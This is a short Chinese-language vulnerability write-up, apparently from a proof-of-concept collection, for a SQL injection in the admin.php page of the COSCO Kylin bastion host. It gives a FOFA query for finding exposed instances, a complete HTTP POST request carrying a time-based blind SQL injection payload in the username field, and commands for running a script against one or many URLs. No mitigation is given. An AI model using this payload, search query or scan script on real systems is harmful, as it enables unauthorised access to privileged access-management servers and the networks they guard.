# 中远麒麟堡垒机存在SQL注入

### 1.漏洞描述

麒麟堡垒机用于运维管理的认证、授权、审计等监控管理，在该产品admin.php处存在SQL 注入漏洞

### 2.fofa语法

```
cert.subject="Baolei"
```

### 3.漏洞复现

```
POST /admin.php?controller=admin_commonuser HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 78
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719833303020-87fbfc46-b9fe-450d-beee-60f9c88947a2.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)

### 4.py脚本使用

```
python3 360 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 360 脚本文件名 -f url.txt             # 测试多个url
```

